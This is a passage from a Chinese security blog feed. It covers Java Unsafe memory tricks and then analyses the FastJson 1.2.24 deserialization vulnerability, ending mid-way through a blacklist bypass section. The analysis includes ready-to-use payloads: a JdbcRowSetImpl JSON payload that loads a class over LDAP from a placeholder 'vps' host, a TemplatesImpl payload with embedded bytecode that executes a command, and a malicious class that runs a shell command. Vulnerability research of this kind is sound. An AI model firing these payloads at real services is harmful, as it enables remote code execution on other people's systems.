System.out.println(flag2);<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Guard</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> ACCESS_ALLOWED = <span class="hljs-number">1</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">giveAccess</span><span class="hljs-params">()</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">42</span> == ACCESS_ALLOWED;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>获取目标对象字段在内存中的offset，使用putInt()方法，修改类的私有变量ACCESS_ALLOWED</p><p>在已知类结构的时候，数据的偏移总是可以获得的（与c++中的类中数据的偏移计算是一致的）</p><p>sizeOf 计算内存大小（Unsafe.getDeclaredFields和Unsafe.objectFieldOffset）</p><h3 id="sizeOf"><a href="#sizeOf" class="headerlink" title="sizeOf"></a>sizeOf</h3><p>结合反射和objectFieldOffset()函数实现类似c中的sizeof()函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    Guard guard = <span class="hljs-keyword">new</span> Guard();<br>    sizeOf(guard); <span class="hljs-comment">// 16, the size of guard</span><br>&#125;<br><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Guard</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> ACCESS_ALLOWED = <span class="hljs-number">1</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">giveAccess</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">42</span> == ACCESS_ALLOWED;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">sizeOf</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    Field f = Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>    f.setAccessible(<span class="hljs-keyword">true</span>);<br>    Unsafe unsafe = (Unsafe) f.get(<span class="hljs-keyword">null</span>);<br><br>    HashSet&lt;Field&gt; fields = <span class="hljs-keyword">new</span> HashSet();<br>    Class c = o.getClass();<br>    <span class="hljs-keyword">while</span> (c != Object.class) &#123;<br>        <span class="hljs-keyword">for</span> (Field field : c.getDeclaredFields()) &#123;<br>            <span class="hljs-keyword">if</span> ((field.getModifiers() &amp; Modifier.STATIC) == <span class="hljs-number">0</span>) &#123;<br>                fields.add(field);<br>            &#125;<br>        &#125;<br>        c = c.getSuperclass();<br>    &#125;<br><br>    <span class="hljs-comment">// get offset</span><br>    <span class="hljs-keyword">long</span> maxSize = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (Field field : fields) &#123;<br>        <span class="hljs-keyword">long</span> offset = unsafe.objectFieldOffset(field);<br>        <span class="hljs-keyword">if</span> (offset &gt; maxSize) &#123;<br>            maxSize = offset;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ((maxSize/<span class="hljs-number">8</span>) + <span class="hljs-number">1</span>) * <span class="hljs-number">8</span>;   <span class="hljs-comment">// padding</span><br>&#125;<br></code></pre></td></tr></table></figure><p>算法的思路非常清晰：从底层子类开始，依次取出它自己和它的所有超类的非静态域，放置到一个HashSet中（重复的只计算一次，Java是单继承），然后使用objectFieldOffset()获得一个最大偏移，最后还考虑了对齐</p><h3 id="Shallow-copy"><a href="#Shallow-copy" class="headerlink" title="Shallow copy"></a>Shallow copy</h3><p>利用Unsafe.copyMemory()，将老地址及其指向的对象的size，拷贝到新的内存地址上。并且浅复制函数可以应用于任意java对象，它的尺寸是动态计算的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Field f = Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        f.setAccessible(<span class="hljs-keyword">true</span>);<br>        unsafe = (Unsafe) f.get(<span class="hljs-keyword">null</span>);<br>        Guard guard = <span class="hljs-keyword">new</span> Guard();<br>        shallowCopy(guard);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Unsafe <span class="hljs-title">getUnsafe</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> unsafe;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> Object <span class="hljs-title">shallowCopy</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">long</span> size = sizeOf(obj);<br>        <span class="hljs-keyword">long</span> start = toAddress(obj);<br>        <span class="hljs-keyword">long</span> address = getUnsafe().allocateMemory(size);<br>        getUnsafe().copyMemory(start, address, size);<br>        <span class="hljs-keyword">return</span> fromAddress(address);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">toAddress</span><span class="hljs-params">(Object obj)</span> </span>&#123;<br>        Object[] array = <span class="hljs-keyword">new</span> Object[]&#123;obj&#125;;<br>        <span class="hljs-keyword">long</span> baseOffset = getUnsafe().arrayBaseOffset(Object[].class);<br>        <span class="hljs-keyword">return</span> normalize(getUnsafe().getLong(array, baseOffset));<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> Object <span class="hljs-title">fromAddress</span><span class="hljs-params">(<span class="hljs-keyword">long</span> address)</span> </span>&#123;<br>        Object[] array = <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-keyword">null</span>&#125;;<br>        <span class="hljs-keyword">long</span> baseOffset = getUnsafe().arrayBaseOffset(Object[].class);<br>        getUnsafe().putLong(array, baseOffset, address);<br>        <span class="hljs-keyword">return</span> array[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Guard</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> ACCESS_ALLOWED = <span class="hljs-number">1</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">giveAccess</span><span class="hljs-params">()</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">42</span> == ACCESS_ALLOWED;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">sizeOf</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Field f = Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        f.setAccessible(<span class="hljs-keyword">true</span>);<br>        Unsafe unsafe = (Unsafe) f.get(<span class="hljs-keyword">null</span>);<br><br>        HashSet&lt;Field&gt; fields = <span class="hljs-keyword">new</span> HashSet();<br>        Class c = o.getClass();<br>        <span class="hljs-keyword">while</span> (c != Object.class) &#123;<br>            <span class="hljs-keyword">for</span> (Field field : c.getDeclaredFields()) &#123;<br>                <span class="hljs-keyword">if</span> ((field.getModifiers() &amp; Modifier.STATIC) == <span class="hljs-number">0</span>) &#123;<br>                    fields.add(field);<br>                &#125;<br>            &#125;<br>            c = c.getSuperclass();<br>        &#125;<br><br>        <span class="hljs-comment">// get offset</span><br>        <span class="hljs-keyword">long</span> maxSize = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (Field field : fields) &#123;<br>            <span class="hljs-keyword">long</span> offset = unsafe.objectFieldOffset(field);<br>            <span class="hljs-keyword">if</span> (offset &gt; maxSize) &#123;<br>                maxSize = offset;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ((maxSize / <span class="hljs-number">8</span>) + <span class="hljs-number">1</span>) * <span class="hljs-number">8</span>;   <span class="hljs-comment">// padding</span><br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="Hide-Password"><a href="#Hide-Password" class="headerlink" title="Hide Password"></a>Hide Password</h3><p>一般密码都要存成byte[]或者char[]数组，为什么呢？因为我们使用完了，可以直接将他们设为null。但如果密码存在String中，将其设为null，密码实际任然存在在内存中，等到GC后，才能被释放，就很不安全。所以当我们把密码字段存储在String中时，在密码字段使用完之后，最安全的做法是：将它的值覆盖。很多不再需要的，但是又是比较机密的对象，想快点消灭证据，都可以通过这种方法来消除。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Field stringValue = String.class.getDeclaredField(<span class="hljs-string">&quot;value&quot;</span>);<br>stringValue.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-keyword">char</span>[] mem = (<span class="hljs-keyword">char</span>[]) stringValue.get(password);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; mem.length; i++) &#123;<br>    mem[i] = <span class="hljs-string">&#x27;?&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Multiple-Inheritance"><a href="#Multiple-Inheritance" class="headerlink" title="Multiple Inheritance"></a>Multiple Inheritance</h3><p>在java中没有多继承，除非我们能在这些不同的类互相强制转换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">long</span> intClassAddress = normalize(getUnsafe().getInt(<span class="hljs-keyword">new</span> Integer(<span class="hljs-number">0</span>), <span class="hljs-number">4L</span>));<br><span class="hljs-keyword">long</span> strClassAddress = normalize(getUnsafe().getInt(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">4L</span>));<br>getUnsafe().putAddress(intClassAddress + <span class="hljs-number">36</span>, strClassAddress);<br></code></pre></td></tr></table></figure><p>上面这段代码将String添加为int的父类，所以我们转换的时候就不会报错了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">(String) (Object) (<span class="hljs-keyword">new</span> Integer(<span class="hljs-number">666</span>))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>FastJson反序列化</title>
    <link href="/2023/03/15/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/03/15/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="FastJson反序列化"><a href="#FastJson反序列化" class="headerlink" title="FastJson反序列化"></a>FastJson反序列化</h1><p>java处理JSON数据有三个比较流行的类库，gson(google维护)、jackson、fastjson，fastjson是阿里巴巴一个开源的json相关的java library，主要的API：JSON.parseObject和JSON.parse</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>创建一个springboot，mavenn添加fastjson1.2.24依赖</p><p>代码可以参考vulhub的fastjsondemo.jar包</p><p><a href="https://dongguabai.blog.csdn.net/article/details/86617059?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_paycolumn_v3&utm_relevant_index=2">启动服务可能遇到的问题</a></p><p>需要在创建springboot勾选web模块</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220320234749700.png"></p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>访问页面返回一个json，修改一下值post回去，发现可以更新json中的name值，age固定返回20</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220321203139793.png"></p><p>编写一个恶意类用来远程加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Touchfile</span> </span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            String[] cmd = &#123; <span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;/tmp/success&quot;</span> &#125;;<br>            Runtime.getRuntime().exec(cmd).waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> do nothing</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译，起一个http.server，再起一个marshalsec.ldap “<a href="http://vps/#Touchfile&quot;">http://vps/#Touchfile&quot;</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220321225602870.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>有两个payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://vps/Touchfile&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="hljs-attr">&quot;_bytecodes&quot;</span>:[<span class="hljs-string">&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=&quot;</span>],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,<span class="hljs-attr">&quot;_outputProperties&quot;</span>:&#123; &#125;&#125;<br></code></pre></td></tr></table></figure><p>着重分析第一个payload，参考<a href="https://xz.aliyun.com/t/8046?page=4#toc-4">summer师傅</a>的文章，payload分三部分，<code>@type</code> 、<code>dataSourceName</code> 、<code>autoCommit</code></p><p>第一个<code>@type</code>的作用？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.fastjsondemo;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typedowhat</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        User user = <span class="hljs-keyword">new</span> User();<br>        user.setAge(<span class="hljs-number">18</span>);<br>        user.setName(<span class="hljs-string">&quot;h^k&quot;</span>);<br><br>        String str1 = JSONObject.toJSONString(user);<br>        String str2 = JSONObject.toJSONString(user, SerializerFeature.WriteClassName);<span class="hljs-comment">//两者做对比</span><br><br>        System.out.println(str1);<br>        System.out.println(str2);<br>        <span class="hljs-comment">//可知@type的作用是指定json解析到哪个类</span><br><br>        <span class="hljs-comment">//解析</span><br>        System.out.println(JSON.parse(str1));<br>        System.out.println(JSON.parse(str2));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;age&quot;</span>:<span class="hljs-number">18</span>,<span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;h^k&quot;</span>&#125;<br>&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.example.fastjsondemo.User&quot;</span>,<span class="hljs-attr">&quot;age&quot;</span>:<span class="hljs-number">18</span>,<span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;h^k&quot;</span>&#125;<br>&#123;<span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;h^k&quot;</span>,<span class="hljs-attr">&quot;age&quot;</span>:<span class="hljs-number">18</span>&#125;<br>com.example.fastjsondemo.User@<span class="hljs-number">7</span>de26db8<br></code></pre></td></tr></table></figure><p>@type字段用来指定该JSON还原成何种类型的对象，在反序列化的时候方便操作</p><p>因此在JSON序列化的方法加入<code>SerializerFeature.WriteClassName</code>特征字段。序列化出来的结果会在开头加一个<code>@type</code>字段，值为进行序列化的类名。同时，漏洞也就跃然纸上了，通过<code>@type</code>控制获取到的类对象</p><p>断点打在JSON.parse()方法上，一步步跟到</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322174230645.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322174547070.png"></p><p>匹配<code>&#123;</code>，开始解析了，case 12创建对象，调用parseObject()方法解析</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322203041861.png"></p><p>json格式中的<code>,</code> <code>&quot;</code> <code>:</code> <code>&#125;</code>在parseObject方法里面开始匹配</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322204905966.png"></p><p>获取到<code>@type</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322215646236.png"></p><p>判断<code>key == JSON.DEFAULT_TYPE_KEY</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322215934108.png"></p><p>开始反序列化</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322220329863.png"></p><p><code>deserializer.deserialze(this, clazz, fieldName);</code></p><p>步进下去会提示<code>debug info not available</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323004328629.png"></p><p><a href="https://blog.csdn.net/hl_java/article/details/79078886">原因&amp;解决方法</a>，这里不解决了，Ctrl+鼠标单击，焯</p><p>来到这里，浏览很久还没有看到setValue，折一下这么长。。没有debug的痛苦</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323004724811.png"></p><p>在github找到Gadget链🤣</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">/<span class="hljs-strong">**</span><br><span class="hljs-strong"> <span class="hljs-emphasis">* Gadget chain:</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"> *</span>      JSON.parse()</span><br><span class="hljs-strong"> <span class="hljs-emphasis">*          DefaultJSONParser.parse()</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"> *</span>              DefaultJSONParser.parseObject()</span><br><span class="hljs-strong"> <span class="hljs-emphasis">*                  JavaBeanDeserializer.deserialze()</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"> *</span>                      JavaBeanDeserializer.parseRest()</span><br><span class="hljs-strong"> <span class="hljs-emphasis">*                          FieldDeserializer.setValue()</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"> *</span>                              Reflect.invoke()</span><br><span class="hljs-strong"> <span class="hljs-emphasis">*                                  JdbcRowSetImpl.setAutoCommit()</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"> *</span></span><br><span class="hljs-strong"> <span class="hljs-emphasis">*/</span></span><br></code></pre></td></tr></table></figure><p>搜索<code>setValue()</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323005644331.png"></p><p>进来继续断点，可以debug了</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323010217147.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323010747848.png"></p><p>invoke往下一直跟</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323010837490.png"></p><p>调用connect方法</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323011648052.png"></p><p>至此开花</p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>版本迭代后，通过检测还原类并比对黑名单的方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; denyList.length; ++i) &#123;<br>    String deny = denyList[i];<br>    <span class="hljs-keyword">if</span> (className.startsWith(deny)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/20190724201853.png"></p><p>同时还关闭反序列化任意类<a href="https://github.com/alibaba/fastjson/wiki/enable_autotype">Autotype</a></p><p>黑名单的绕过：</p><p><code>TypeUtils.loadClass</code>真正加载class类时，有这样一段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (className.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="hljs-number">1</span>), classLoader);<br>    <span class="hljs-keyword">return</span> Array.newInstance(componentType, 